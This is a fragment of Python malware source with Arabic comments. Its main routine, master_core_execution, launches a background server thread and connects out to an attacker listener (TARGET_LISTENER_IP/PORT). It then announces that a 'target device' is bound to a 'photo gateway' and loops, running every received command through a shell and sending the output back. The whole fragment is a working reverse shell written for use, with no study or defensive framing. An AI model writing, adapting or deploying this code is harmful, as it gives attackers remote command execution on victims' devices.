# [6] النواة التنفيذية الرئيسية والاتصال العكسي (Main Execution Pipeline)
# ---------------------------------------------------------------------
def master_core_execution():
    """النواة التنفيذية الممتدة لربط تفاعل الصورة بالاتصال العكسي وقوائم الأزرار"""
    try:
        time.sleep(0.5)
        
        # 1. تشغيل خادم الاستضافة السحابي في الخلفية
        threading.Thread(target=run_cloud_server, daemon=True).start()
        
        # 2. تفعيل قناة الاتصال العكسي (Reverse Shell Sockets)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_LISTENER_IP, TARGET_LISTENER_PORT))
        sock.send(b"[MASTER_CORE_ONLINE] Target device bound to 500+ buttons catalog and photo gateway.\n")
        
        # 3. حلقة استقبال وتنفيذ الأوامر الحية
        while True:
            cmd = sock.recv(32768).decode('utf-8')
            if not cmd:
                break
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = res.stdout + res.stderr
            sock.send(output.encode('utf-8'))
    except Exception as e:
        send_master_notification("خطأ في النواة الرئيسية", str(e), is_critical=True)

if __name__ == "__main__":
    # الإطلاق الرسمي للنسخة الشاملة والمحدثة بالكامل
    master_core_execution()
